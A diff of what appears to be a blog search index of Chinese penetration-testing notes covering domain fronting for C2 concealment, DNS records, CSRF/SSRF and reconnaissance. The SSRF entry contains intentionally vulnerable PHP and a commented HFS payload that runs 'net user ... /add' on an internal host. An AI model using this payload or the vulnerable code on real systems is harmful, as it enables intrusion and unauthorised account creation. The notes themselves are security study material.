@@ -5,6 +5,15 @@
     <url>/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<h2 id="什么是域前置"><a href="#什么是域前置" class="headerlink" title="什么是域前置"></a>什么是域前置</h2><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2(Command and Control)服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p>
 <p>利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信</p>
+<h2 id="其他知识–域名解析记录类型"><a href="#其他知识–域名解析记录类型" class="headerlink" title="其他知识–域名解析记录类型"></a>其他知识–域名解析记录类型</h2><p>1、A (Address) 记录<br>是用来指定<a href="https://so.csdn.net/so/search?q=%E4%B8%BB%E6%9C%BA%E5%90%8D&spm=1001.2101.3001.7020">主机名</a>（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/b387c7e7abb08c5c048d3a6e807cb9f6.png" alt="img"></p>
+<p>2、别名(CNAME)记录<br>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。 通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。 它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。 这两个别名的全称就是“<a href="http://www.mydomain.com”和“mail.mydomain.com”.实际上他们都指向“host.mydomain.com”./">www.mydomain.com”和“mail.mydomain.com”。实际上他们都指向“host.mydomain.com”。</a></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/1efd3987e07018e881857b4561bc87ee.png" alt="img"></p>
+<p>3、MX（Mail Exchanger）记录<br>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <a href="mailto:&#117;&#x73;&#101;&#114;&#64;&#122;&#x68;&#x6f;&#x6e;&#103;&#106;&#105;&#x65;&#46;&#x63;&#111;&#109;">&#117;&#x73;&#101;&#114;&#64;&#122;&#x68;&#x6f;&#x6e;&#103;&#106;&#105;&#x65;&#46;&#x63;&#111;&#109;</a> 时，该用户的邮件系统通过DNS查找zhongjie.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/6cc3e66a493470c669a38c15a8a9343d.png" alt="img"></p>
+<p>4、TXT记录<br>TXT记录一般指为某个主机名或域名设置的说明，如：<br>1）admin IN TXT “jack, mobile:13800138000”；<br>2）mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:&#x61;&#98;&#x63;&#x40;&#x6d;&#97;&#x69;&#x6c;&#x73;&#101;&#114;&#x76;&#x65;&#x72;&#46;&#99;&#111;&#x6d;">&#x61;&#98;&#x63;&#x40;&#x6d;&#97;&#x69;&#x6c;&#x73;&#101;&#114;&#x76;&#x65;&#x72;&#46;&#99;&#111;&#x6d;</a>“也就是您可以设置 TXT ，以便使别人联系到您。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/9b56f3771ee8c12a6c4b9e1ab7c8e08a.png" alt="img"></p>
+<p>5、NS记录<br>ns记录全称为Name Server 是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>Windows Server 2008 R2: 192.168.184.132（NAT）</p>
 <p>域名：wcl078.shiyan078</p>
 <p>用户名：administrator</p>
@@ -514,6 +523,69 @@
       </tags>
   </entry>
   <entry>
+    <title>CSRF及SSRF</title>
+    <url>/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/</url>
+    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
+<p>跨站脚本请求</p>
+<p>Cross-Site Request Forgery</p>
+</blockquote>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF.png" alt="CSRF"></p>
+<p>攻击者在自己的服务器上构造了攻击代码（比如知道添加管理员的数据包），受害者（管理员）用自己的身份权限在自己的浏览器去访问攻击链接</p>
+<span id="more"></span>
+
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>利用burp抓包，并且发送至<code>Generate CSRF PoC</code>这个插件</p>
+<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-1.png" alt="CSRF检测-1"></p>
+<p>在这个页面修改信息，并生成攻击代码</p>
+<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-2.png" alt="CSRF检测-2"></p>
+<p>copy攻击代码后，将其放在自己的服务器上</p>
+<p>然后用受害者身份在受害者的环境去访问，若信息修改成功，则存在CSRF</p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106097698">Pikachu靶场</a></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.当用户发送重要的请求时需要输入原始密码</p>
+<p>2.设置随机<code>token</code>，检测数据报的唯一性（最有效）</p>
+<p>3.校验<code>Referer</code>来源，请求时判断请求链接是否是当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</p>
+<p>4.设置验证码</p>
+<p>5.限制请求方式只能为POST</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote>
+<p>服务器请求伪造</p>
+<p>Server-Side Request Forgery</p>
+</blockquote>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9B%BE%E8%A7%A3.png" alt="SSRF图解"></p>
+<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等</p>
+<p>相当于是可以将存在SSRF的服务器<strong>作为一个代理</strong>，去访问其内网服务端的资源</p>
+<p>利用SSRF能实现以下效果:<br>1.扫描内网（主机信息收集，Web应用指纹识别）<br>2.根据所识别应用发送构造的Payload进行攻击<br>3.Denial of service（拒绝服务DOS）</p>
+<h3 id="各个协议调用探针"><a href="#各个协议调用探针" class="headerlink" title="各个协议调用探针"></a>各个协议调用探针</h3><p>http</p>
+<p>file</p>
+<p>dict</p>
+<p>ftp</p>
+<p>gopher</p>
+<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>端口扫描、指纹识别、漏洞利用、内网探针</p>
+<p><a href="http://192.168.xx.xx/phpmyadmin">http://192.168.xx.xx/phpmyadmin</a></p>
+<p>file:///D:/<a href="http://www.txt/">www.txt</a></p>
+<p>dict://192.168.xx.xx:3306/info</p>
+<p><a href="ftp://192.168.xx.xx/">ftp://192.168.xx.xx:21</a></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    请输入图片地址：&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;url&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*内网的某台主机村子啊HFS漏洞,这里是通过存在SSRF的服务器对其内网主机进行利用</span></span><br><span class="line"><span class="comment">url=$_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="comment">$img = file_get_contents(&#x27;http://192.168.xx.xx:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);</span></span><br><span class="line"><span class="comment">echo $url;</span></span><br><span class="line"><span class="comment">echo $img;</span></span><br><span class="line"><span class="comment">//header(&quot;Content-Type: img/jpeg;text/html; charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//echo $img;</span></span><br><span class="line"><span class="comment">//$file = fopen(&#x27;x,png, &#x27;w+&#x27;);</span></span><br><span class="line"><span class="comment">//fwrite($file, $img);</span></span><br><span class="line"><span class="comment">//fclose($file);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;URL&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.png" alt="SSRF漏洞挖掘"></p>
+<h3 id="SSRF在各个编程语言中可以使用的协议"><a href="#SSRF在各个编程语言中可以使用的协议" class="headerlink" title="SSRF在各个编程语言中可以使用的协议"></a>SSRF在各个编程语言中可以使用的协议</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9C%A8%E5%90%84%E4%B8%AA%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE.png" alt="SSRF在各个编程语言中可以使用的协议"></p>
+<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p>地址：<a href="https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top">https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top</a></p>
+<p>当输入<code>http://127.0.0.1</code>与直接输入<code>127.0.0.1</code>返回结果有差异，表明可能存在SSRF漏洞</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://pan.baidu.com/s/1bp96ECJ">CSRFTester-1.0</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+<p><a href="https://blog.csdn.net/Android_wxf/article/details/118582585">CSDN-看我一招征服SSRF</a></p>
+<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&spm_id_from=pageDriver">【小迪安全】WEB漏洞-CSRF及SSRF</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>CSRF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnstack4靶场内网渗透</title>
     <url>/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
@@ -868,69 +940,6 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSRF及SSRF</title>
-    <url>/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/</url>
-    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
-<p>跨站脚本请求</p>
-<p>Cross-Site Request Forgery</p>
-</blockquote>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF.png" alt="CSRF"></p>
-<p>攻击者在自己的服务器上构造了攻击代码（比如知道添加管理员的数据包），受害者（管理员）用自己的身份权限在自己的浏览器去访问攻击链接</p>
-<span id="more"></span>
-
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>利用burp抓包，并且发送至<code>Generate CSRF PoC</code>这个插件</p>
-<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-1.png" alt="CSRF检测-1"></p>
-<p>在这个页面修改信息，并生成攻击代码</p>
-<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-2.png" alt="CSRF检测-2"></p>
-<p>copy攻击代码后，将其放在自己的服务器上</p>
-<p>然后用受害者身份在受害者的环境去访问，若信息修改成功，则存在CSRF</p>
-<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106097698">Pikachu靶场</a></p>
-<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.当用户发送重要的请求时需要输入原始密码</p>
-<p>2.设置随机<code>token</code>，检测数据报的唯一性（最有效）</p>
-<p>3.校验<code>Referer</code>来源，请求时判断请求链接是否是当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</p>
-<p>4.设置验证码</p>
-<p>5.限制请求方式只能为POST</p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote>
-<p>服务器请求伪造</p>
-<p>Server-Side Request Forgery</p>
-</blockquote>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9B%BE%E8%A7%A3.png" alt="SSRF图解"></p>
-<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等</p>
-<p>相当于是可以将存在SSRF的服务器<strong>作为一个代理</strong>，去访问其内网服务端的资源</p>
-<p>利用SSRF能实现以下效果:<br>1.扫描内网（主机信息收集，Web应用指纹识别）<br>2.根据所识别应用发送构造的Payload进行攻击<br>3.Denial of service（拒绝服务DOS）</p>
-<h3 id="各个协议调用探针"><a href="#各个协议调用探针" class="headerlink" title="各个协议调用探针"></a>各个协议调用探针</h3><p>http</p>
-<p>file</p>
-<p>dict</p>
-<p>ftp</p>
-<p>gopher</p>
-<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>端口扫描、指纹识别、漏洞利用、内网探针</p>
-<p><a href="http://192.168.xx.xx/phpmyadmin">http://192.168.xx.xx/phpmyadmin</a></p>
-<p>file:///D:/<a href="http://www.txt/">www.txt</a></p>
-<p>dict://192.168.xx.xx:3306/info</p>
-<p><a href="ftp://192.168.xx.xx/">ftp://192.168.xx.xx:21</a></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    请输入图片地址：&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;url&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*内网的某台主机村子啊HFS漏洞,这里是通过存在SSRF的服务器对其内网主机进行利用</span></span><br><span class="line"><span class="comment">url=$_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="comment">$img = file_get_contents(&#x27;http://192.168.xx.xx:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);</span></span><br><span class="line"><span class="comment">echo $url;</span></span><br><span class="line"><span class="comment">echo $img;</span></span><br><span class="line"><span class="comment">//header(&quot;Content-Type: img/jpeg;text/html; charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//echo $img;</span></span><br><span class="line"><span class="comment">//$file = fopen(&#x27;x,png, &#x27;w+&#x27;);</span></span><br><span class="line"><span class="comment">//fwrite($file, $img);</span></span><br><span class="line"><span class="comment">//fclose($file);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;URL&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.png" alt="SSRF漏洞挖掘"></p>
-<h3 id="SSRF在各个编程语言中可以使用的协议"><a href="#SSRF在各个编程语言中可以使用的协议" class="headerlink" title="SSRF在各个编程语言中可以使用的协议"></a>SSRF在各个编程语言中可以使用的协议</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9C%A8%E5%90%84%E4%B8%AA%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE.png" alt="SSRF在各个编程语言中可以使用的协议"></p>
-<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p>地址：<a href="https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top">https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top</a></p>
-<p>当输入<code>http://127.0.0.1</code>与直接输入<code>127.0.0.1</code>返回结果有差异，表明可能存在SSRF漏洞</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://pan.baidu.com/s/1bp96ECJ">CSRFTester-1.0</a></p>
-<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
-<p><a href="https://blog.csdn.net/Android_wxf/article/details/118582585">CSDN-看我一招征服SSRF</a></p>
-<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&spm_id_from=pageDriver">【小迪安全】WEB漏洞-CSRF及SSRF</a></p>
-]]></content>
-      <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>CSRF</tag>
-        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -1514,6 +1523,58 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集</title>
+    <url>/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p><img src="/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF.png" alt="信息收集思路"></p>
+<span id="more"></span>
+
+<h2 id="CDN-多网"><a href="#CDN-多网" class="headerlink" title="CDN(多网)"></a>CDN(多网)</h2><p>CDN(内容分发网络)通过遍布全国的缓存边缘节点、内部专用线路以及完善的网络路由调度机制为用户自动选择最佳网络访问路径，将源站的内容分发到最接近用户的网络边缘节点，解决用户访问速度慢的问题，提供全方位的更快、更稳定、更便捷的网络访问体验。</p>
+<h2 id="WAF-Web-Application-Firewall"><a href="#WAF-Web-Application-Firewall" class="headerlink" title="WAF(Web Application Firewall)"></a>WAF(Web Application Firewall)</h2><p>网站应用级入侵防御系统，web应用防火墙是通过一些列针对HTTP/HTTPS的安全册罗来专门为Web应用提供保护的一款产品</p>
+<h2 id="CMS-Content-Management-System"><a href="#CMS-Content-Management-System" class="headerlink" title="CMS(Content Management System)"></a>CMS(Content Management System)</h2><p>意为”内容管理系统”。 </p>
+<p>内容管理系统（content management system，CMS）是一种位于WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。</p>
+<p>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。</p>
+<p>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。</p>
+<h2 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h2><h3 id="目录站点"><a href="#目录站点" class="headerlink" title="目录站点"></a>目录站点</h3><p>/bbs/    论坛</p>
+<h3 id="端口站点"><a href="#端口站点" class="headerlink" title="端口站点"></a>端口站点</h3><p>:8080</p>
+<p>通过开放的端口，分析站点开启了哪些服务</p>
+<h3 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h3><p>同一ip：</p>
+<p><strong>bbs</strong>.goodlift.net</p>
+<p><strong>www</strong>.goodlift.net</p>
+<p>不同ip：</p>
+<p><a href="http://www.etiantian.com/">www.etiantian.com</a></p>
+<p>web.etiantian.com</p>
+<h3 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h3><h3 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h3><h4 id="旁注：同服务器不同站点"><a href="#旁注：同服务器不同站点" class="headerlink" title="旁注：同服务器不同站点"></a>旁注：同服务器不同站点</h4><p>前提条件：该服务器有多个站点</p>
+<p>例如：192.168.1.100</p>
+<p>​            <a href="http://www.a.com/">www.a.com</a></p>
+<p>​            <a href="http://www.b.com/">www.b.com</a></p>
+<p>可以通过找到b的漏洞来攻击a站点</p>
+<h4 id="C段：同网段不同服务器不同站点（困难）"><a href="#C段：同网段不同服务器不同站点（困难）" class="headerlink" title="C段：同网段不同服务器不同站点（困难）"></a>C段：同网段不同服务器不同站点（困难）</h4><p>前提条件：独立站点服务器，该服务器只有一个站点利用</p>
+<p>例如：192.168.1.100</p>
+<p>​            <a href="http://www.a.com/">www.a.com</a></p>
+<p>​            </p>
+<p>例如：192.168.1.101</p>
+<p>​            <a href="http://www.b.com/">www.b.com</a></p>
+<p>​            </p>
+<h3 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h3><p>phpstudy、宝塔等</p>
+<p>shodan（一款黑暗搜索引擎）</p>
+<h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><p><a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg?_at_=1626861335971">漏了个大洞.zip_免费高速下载|百度网盘-分享无限制 (baidu.com)</a>提取码：0b7b</p>
+<p><a href="http://www.xyaz.cn/">【逍遥安卓模拟器】安卓模拟器电脑版_安卓模拟器哪个好用_逍遥安卓模拟器下载官网 (xyaz.cn)</a></p>
+<h2 id="信息搜集思路"><a href="#信息搜集思路" class="headerlink" title="信息搜集思路"></a>信息搜集思路</h2><p>找到目标域名，用百度、Google搜索suit:+域名，得到</p>
+<h2 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h2><p>layer子域名挖掘机 4.2版本</p>
+<p>如果存在CDN，用外网去ping可得到真实ip地址，工具<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET</a></p>
+<p>查证书的<a href="https://crt.sh(也涉及一些子域名)/">https://crt.sh（也涉及一些子域名）</a></p>
+<p>查询DNS记录<a href="https://dnsdb.io/zh-cn/">DNSDB</a></p>
+<p><a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MSF和CS联动</title>
     <url>/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/</url>
     <content><![CDATA[<h2 id="CS委派给MSF"><a href="#CS委派给MSF" class="headerlink" title="CS委派给MSF"></a>CS委派给MSF</h2><p>创建Foreign监听器-&gt;MSF监听模块设置对应地址端口-&gt;CS执行Spawn选择监听器</p>
@@ -1579,58 +1640,6 @@ set session [session的id]
       <tags>
         <tag>渗透测试</tag>
         <tag>内网安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集</title>
-    <url>/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<p><img src="/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF.png" alt="信息收集思路"></p>
-<span id="more"></span>
-
-<h2 id="CDN-多网"><a href="#CDN-多网" class="headerlink" title="CDN(多网)"></a>CDN(多网)</h2><p>CDN(内容分发网络)通过遍布全国的缓存边缘节点、内部专用线路以及完善的网络路由调度机制为用户自动选择最佳网络访问路径，将源站的内容分发到最接近用户的网络边缘节点，解决用户访问速度慢的问题，提供全方位的更快、更稳定、更便捷的网络访问体验。</p>
-<h2 id="WAF-Web-Application-Firewall"><a href="#WAF-Web-Application-Firewall" class="headerlink" title="WAF(Web Application Firewall)"></a>WAF(Web Application Firewall)</h2><p>网站应用级入侵防御系统，web应用防火墙是通过一些列针对HTTP/HTTPS的安全册罗来专门为Web应用提供保护的一款产品</p>
-<h2 id="CMS-Content-Management-System"><a href="#CMS-Content-Management-System" class="headerlink" title="CMS(Content Management System)"></a>CMS(Content Management System)</h2><p>意为”内容管理系统”。 </p>
